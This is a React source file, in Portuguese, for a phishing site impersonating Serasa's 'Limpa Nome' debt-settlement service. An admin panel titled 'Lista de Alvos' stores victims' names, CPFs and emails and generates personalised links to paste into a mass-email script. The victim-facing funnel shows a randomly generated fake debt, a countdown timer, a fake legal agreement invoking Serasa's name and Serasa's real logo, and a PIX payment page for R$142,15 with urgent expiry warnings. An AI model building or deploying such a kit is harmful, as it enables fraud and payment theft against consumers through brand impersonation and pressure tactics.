import React, { useState, useEffect } from 'react';
import { 
  Menu, User, CheckCircle2, ShieldCheck, ArrowRight, 
  Lock, AlertCircle, CreditCard, FileText, AlertTriangle, 
  Clock, Mail, Users, LayoutDashboard, Send, Plus, Trash2, ExternalLink
} from 'lucide-react';

const SerasaSystem = () => {
  // ESTADOS GERAIS
  const [view, setView] = useState('client'); // 'client' ou 'admin'
  const [step, setStep] = useState('landing');
  const [userData, setUserData] = useState({ name: '', cpf: '' });
  const [debtValue, setDebtValue] = useState('0,00');
  const [loading, setLoading] = useState(false);
  const [timer, setTimer] = useState(899);
  
  // ESTADOS DO ADMIN
  const [leads, setLeads] = useState([
    { name: 'Exemplo Silva', cpf: '123.456.789-00', email: 'exemplo@email.com', status: 'Pendente' }
  ]);
  const [newLead, setNewLead] = useState({ name: '', cpf: '', email: '' });

  const FINAL_PAYMENT = "142,15";
const BASE_URL = "https://serasa-funil.vercel.app"; // URL atualizada conforme fornecido

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const name = params.get('nome');
    const cpf = params.get('cpf');

    if (name || cpf) {
      setView('client');
      setUserData({ 
        name: name || 'Cliente', 
        cpf: cpf || '000.000.000-00' 
      });
      
      const randomDebt = (Math.random() * (15000 - 4000) + 4000).toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL',
      });
      setDebtValue(randomDebt);
    } else {
      // Se não tem parâmetros na URL, assume que é o Admin tentando acessar
      setView('admin');
    }

    const interval = setInterval(() => {
      setTimer((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleNext = (nextStep) => {
    setLoading(true);
    setTimeout(() => {
      setStep(nextStep);
      setLoading(false);
      window.scrollTo(0, 0);
    }, 800);
  };

  // --- COMPONENTES DE UI ---

  const Header = () => (
    <header className="bg-[#E10075] text-white py-3 px-4 sticky top-0 z-50 shadow-md">
      <div className="max-w-7xl mx-auto flex items-center justify-between">
        <div className="flex items-center gap-4">
          <button className="p-2 hover:bg-white/20 rounded-full transition-colors"><Menu size={24} /></button>
           <img src="https://www.serasa.com.br/lno/static-webfiles/common/products/limpa-nome-white.svg" alt="Serasa" className="h-8 w-auto" />
          </div>
        <button className="flex items-center gap-2 text-sm font-medium bg-white/10 px-4 py-2 rounded-full hover:bg-white/20 transition-all">
          <User size={18} /> <span>Entrar</span>
        </button>
      </div>
    </header>
  );

  // --- VISÃO DO ADMINISTRADOR (PAINEL DE DISPARO) ---
  if (view === 'admin') {
    return (
      <div className="min-h-screen bg-slate-100 font-sans text-slate-900">
        <nav className="bg-slate-900 text-white p-4 flex justify-between items-center shadow-xl">
          <div className="flex items-center gap-2 font-bold text-xl">
            <LayoutDashboard className="text-[#E10075]" /> Serasa Control Panel
          </div>
          <div className="flex gap-4">
            <button onClick={() => setView('client')} className="text-xs bg-slate-700 px-3 py-1 rounded hover:bg-slate-600 transition-all">Ver Site</button>
          </div>
        </nav>

        <main className="max-w-6xl mx-auto p-6 space-y-8">
          {/* Formulário de Cadastro de Bicos */}
          <section className="bg-white p-6 rounded-2xl shadow-sm border border-slate-200">
            <div className="flex items-center gap-2 mb-6 font-bold text-lg text-slate-700">
              <Plus className="text-[#E10075]" /> Adicionar Novo Lead (Bico)
            </div>
            <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
              <input 
                type="text" placeholder="Nome Completo" 
                className="p-3 border rounded-xl focus:ring-2 ring-[#E10075] outline-none"
                value={newLead.name} onChange={e => setNewLead({...newLead, name: e.target.value})}
              />
              <input 
                type="text" placeholder="CPF (000.000.000-00)" 
                className="p-3 border rounded-xl focus:ring-2 ring-[#E10075] outline-none"
                value={newLead.cpf} onChange={e => setNewLead({...newLead, cpf: e.target.value})}
              />
              <input 
                type="email" placeholder="E-mail" 
                className="p-3 border rounded-xl focus:ring-2 ring-[#E10075] outline-none"
                value={newLead.email} onChange={e => setNewLead({...newLead, email: e.target.value})}
              />
              <button 
                onClick={() => {
                  setLeads([...leads, { ...newLead, status: 'Pendente' }]);
                  setNewLead({ name: '', cpf: '', email: '' });
                }}
                className="bg-[#E10075] text-white font-bold py-3 rounded-xl hover:bg-[#c20066] transition-all flex items-center justify-center gap-2"
              >
                <Plus size={20} /> Adicionar
              </button>
            </div>
          </section>

          {/* Tabela de Leads e Links de Disparo */}
          <section className="bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden">
            <div className="p-6 border-b flex justify-between items-center">
              <div className="flex items-center gap-2 font-bold text-lg text-slate-700">
                <Users className="text-[#E10075]" /> Lista de Alvos
              </div>
              <span className="text-xs font-medium bg-slate-100 px-3 py-1 rounded-full text-slate-500">Total: {leads.length}</span>
            </div>
            <div className="overflow-x-auto">
              <table className="w-full text-left text-sm">
                <thead className="bg-slate-50 text-slate-500 uppercase text-xs font-bold">
                  <tr>
                    <th className="p-4">Nome</th>
                    <th className="p-4">CPF</th>
                    <th className="p-4">E-mail</th>
                    <th className="p-4">Link de Disparo</th>
                    <th className="p-4">Ações</th>
                  </tr>
                </thead>
                <tbody className="divide-y">
                  {leads.map((lead, index) => {
                    const customLink = `${BASE_URL}/?nome=${encodeURIComponent(lead.name)}&cpf=${encodeURIComponent(lead.cpf)}`;
                    return (
                      <tr key={index} className="hover:bg-slate-50 transition-colors">
                        <td className="p-4 font-medium">{lead.name}</td>
                        <td className="p-4">{lead.cpf}</td>
                        <td className="p-4">{lead.email}</td>
                        <td className="p-4">
                          <div className="flex items-center gap-2">
                            <input readOnly value={customLink} className="text-xs p-1 bg-slate-100 border rounded w-40" />
                            <button 
                              onClick={() => navigator.clipboard.writeText(customLink)}
                              className="p-1 hover:text-[#E10075] transition-colors" title="Copiar Link"
                            >
                              <ExternalLink size={14} />
                            </button>
                          </div>
                        </td>
                        <td className="p-4">
                          <button 
                            onClick={() => setLeads(leads.filter((_, i) => i !== index))}
                            className="text-red-500 hover:text-red-700 transition-colors"
                          >
                            <Trash2 size={18} />
                          </button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          </section>
          
          <div className="p-4 bg-blue-50 border border-blue-100 rounded-xl text-blue-700 text-sm flex gap-3">
            <Mail className="shrink-0" />
            <p><strong>Sincronização:</strong> Copie o "Link de Disparo" e cole no seu script de e-mail. O site lerá automaticamente o nome e CPF do cliente ao abrir.</p>
          </div>
        </main>
      </div>
    );
  }

  // --- VISÃO DO CLIENTE (FUNIL) ---
  if (loading) {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center justify-center gap-4">
        <div className="w-12 h-12 border-4 border-slate-200 border-t-[#E10075] rounded-full animate-spin"></div>
        <p className="text-slate-500 font-medium animate-pulse">Consultando banco de dados do Serasa...</p>
      </div>
    );
  }

  if (step === 'landing') {
    return (
      <div className="min-h-screen bg-white font-sans text-slate-900">
        <Header />
        <main className="max-w-7xl mx-auto px-4 py-12 lg:flex items-center gap-12">
          <div className="lg:w-1/2 space-y-6">
            <div className="inline-flex items-center gap-2 bg-red-100 text-red-600 px-3 py-1 rounded-full text-xs font-bold uppercase tracking-wider">
              <AlertTriangle size={14} /> Notificação Urgente de Crédito
            </div>
            <h1 className="text-4xl lg:text-6xl font-black leading-tight text-slate-900">
              Limpe seu nome hoje com <span className="text-[#E10075]">até 99% de desconto</span>
            </h1>
            <p className="text-lg text-slate-600">
              Olá, <span className="font-bold text-slate-800">{userData.name}</span>. Foi liberada uma <span className="underline decoration-[#E10075] font-bold">oportunidade única de quitação</span> para o CPF <span className="font-bold text-slate-800">{userData.cpf}</span>.
            </p>
            <div className="bg-slate-50 p-6 rounded-2xl border-2 border-slate-200 space-y-4 shadow-sm">
              <div className="flex items-center gap-3 text-green-600 font-bold">
                <ShieldCheck size={20} /> <span>SISTEMA DE QUITAÇÃO ATIVO</span>
              </div>
              <p className="text-sm text-slate-500 leading-relaxed">
                Atenção: Esta oferta é exclusiva para o seu perfil e expira automaticamente. Ao quitar, seu nome é limpo e seu <strong className="font-bold">Score é impulsionado</strong> para liberação de crédito.
              </p>
              <button onClick={() => handleNext('offer')} className="w-full bg-[#E10075] text-white font-black py-4 rounded-xl hover:bg-[#c20066] transition-all flex items-center justify-center gap-2 text-xl shadow-xl shadow-pink-200 uppercase tracking-tight">
                Ver Valor do Desconto <ArrowRight size={24} />
              </button>
            </div>
          </div>
          <div className="lg:w-1/2 mt-12 lg:mt-0">
            <img src="https://cdn.builder.io/api/v1/image/assets%2Fb212bb18f00a40869a6cd42f77cbeefc%2F9f794558b8a24871931e873d2bc607a6?quality=70" className="w-full max-w-md mx-auto rounded-3xl shadow-2xl border-8 border-white" alt="Oferta" />
          </div>
        </main>
      </div>
    );
  }

  if (step === 'offer') {
    return (
      <div className="min-h-screen bg-slate-50 font-sans">
        <Header />
        <main className="max-w-3xl mx-auto px-4 py-12">
          <div className="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-200">
            <div className="bg-[#E10075] p-6 text-white text-center relative">
              <div className="absolute top-4 right-4 flex items-center gap-2 bg-black/20 px-3 py-1 rounded-full text-xs font-mono">
                <Clock size={14} /> {formatTime(timer)}
              </div>
              <h2 className="text-3xl font-black">OFERTA DE QUITAÇÃO ABSOLUTA</h2>
              <p className="opacity-90">Aproveite o desconto de final de ano antes que expire</p>
            </div>
            <div className="p-8 space-y-8">
              <div className="flex flex-col md:flex-row justify-between items-center p-6 bg-slate-50 rounded-2xl border-2 border-dashed border-slate-300 gap-4">
                <div className="text-center md:text-left">
                  <p className="text-xs text-slate-500 uppercase font-bold">Dívida Total Acumulada</p>
                  <p className="text-2xl text-slate-400 line-through font-medium">{debtValue}</p>
                </div>
                <div className="h-px w-full md:h-12 md:w-px bg-slate-200"></div>
                <div className="text-center md:text-right">
                  <p className="text-xs text-[#E10075] uppercase font-bold">Valor para Quitar Agora</p>
                  <p className="text-4xl font-black text-[#E10075]">R$ {FINAL_PAYMENT}</p>
                </div>
              </div>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="flex items-start gap-3 p-4 bg-green-50 rounded-xl border border-green-100">
                  <CheckCircle2 className="text-green-500 shrink-0" size={20} />
                  <p className="text-sm text-slate-700"><strong className="font-bold">Nome Limpo:</strong> Retirada imediata de todas as restrições do CPF.</p>
                </div>
                <div className="flex items-start gap-3 p-4 bg-green-50 rounded-xl border border-green-100">
                  <CheckCircle2 className="text-green-500 shrink-0" size={20} />
                  <p className="text-sm text-slate-700"><strong className="font-bold">Crédito:</strong> Liberação de novos limites bancários após baixa.</p>
                </div>
              </div>
              <button onClick={() => handleNext('contract')} className="w-full bg-[#E10075] text-white font-black py-5 rounded-xl hover:bg-[#c20066] transition-all text-xl shadow-lg uppercase tracking-tight">
                Quitar Dívida Agora
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  if (step === 'contract') {
    return (
      <div className="min-h-screen bg-slate-100 font-sans">
        <Header />
        <main className="max-w-3xl mx-auto px-4 py-12">
          <div className="bg-white rounded-3xl shadow-2xl p-8 border border-slate-200">
            <div className="flex items-center gap-3 mb-6 text-slate-800">
              <FileText className="text-[#E10075]" /> <h2 className="text-2xl font-bold">Termo de Acordo Extrajudicial</h2>
            </div>
            <div className="bg-slate-50 p-6 rounded-xl text-xs text-slate-600 leading-relaxed h-64 overflow-y-scroll border border-slate-200 mb-8 font-mono">
              <p className="mb-4 font-bold text-slate-800">CLÁUSULA 1ª - DA REGULARIZAÇÃO</p>
              <p className="mb-4">O Sr(a). {userData.name}, CPF {userData.cpf}, declara aceitar a proposta de quitação total de seus débitos mediante o pagamento único de R$ {FINAL_PAYMENT}.</p>
              <p className="mb-4 font-bold text-slate-800">CLÁUSULA 2ª - DA BAIXA DE RESTRIÇÕES</p>
              <p className="mb-4">A Serasa e as instituições credoras comprometem-se a efetuar a baixa de todas as anotações negativas no prazo de até 5 dias úteis após a compensação do pagamento.</p>
              <p className="mb-4 font-bold text-slate-800">CLÁUSULA 3ª - DO CRÉDITO</p>
              <p>A quitação total do débito impactará positivamente a pontuação de crédito (Score), permitindo a reabilitação financeira do cliente.</p>
            </div>
            <div className="space-y-6">
              <div className="flex items-center gap-3 p-4 bg-blue-50 rounded-xl border border-blue-100 text-blue-700 text-sm">
                <Lock size={18} /> <span>Assinatura Digital Criptografada via SSL</span>
              </div>
              <button onClick={() => handleNext('checkout')} className="w-full bg-[#E10075] text-white font-black py-4 rounded-xl hover:bg-[#c20066] transition-all text-lg shadow-lg uppercase">
                Assinar e Gerar Pagamento
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  if (step === 'checkout') {
    return (
      <div className="min-h-screen bg-slate-50 font-sans">
        <Header />
        <main className="max-w-xl mx-auto px-4 py-12">
          <div className="bg-white rounded-3xl shadow-2xl overflow-hidden border border-slate-200 p-8 text-center space-y-6">
            <div className="inline-flex p-3 bg-green-100 text-green-600 rounded-full"><CheckCircle2 size={32} /></div>
            <h2 className="text-3xl font-black text-slate-800">Acordo Confirmado!</h2>
            <p className="text-slate-500">Para liberar seu crédito agora, finalize o pagamento via PIX.</p>
            <div 
              onClick={() => window.location.href = ""} // LINK VAZIO CONFORME PEDIDO
              className="group flex items-center justify-between p-6 border-2 border-slate-200 rounded-2xl cursor-pointer hover:border-[#E10075] transition-all bg-white shadow-sm"
            >
              <div className="flex items-center gap-4">
                <div className="p-3 bg-slate-100 rounded-lg group-hover:bg-pink-50 transition-colors">
                  <CreditCard className="text-slate-600 group-hover:text-[#E10075]" />
                </div>
                <div className="text-left">
                  <p className="font-black text-slate-800 text-lg">PIX (Aprovação Instantânea)</p>
                  <p className="text-sm text-slate-500">Valor: R$ {FINAL_PAYMENT}</p>
                </div>
              </div>
              <ArrowRight className="text-slate-300 group-hover:text-[#E10075]" />
            </div>
            <div className="p-4 bg-red-50 rounded-xl border border-red-100 flex gap-3 text-xs text-red-700">
              <AlertCircle className="shrink-0" size={20} />
              <span className="font-medium">URGENTE: O código PIX expira em 30 minutos. Se não for pago, a oferta de 99% de desconto será cancelada permanentemente.</span>
            </div>
          </div>
        </main>
      </div>
    );
  }

  return null;
};

export default SerasaSystem;
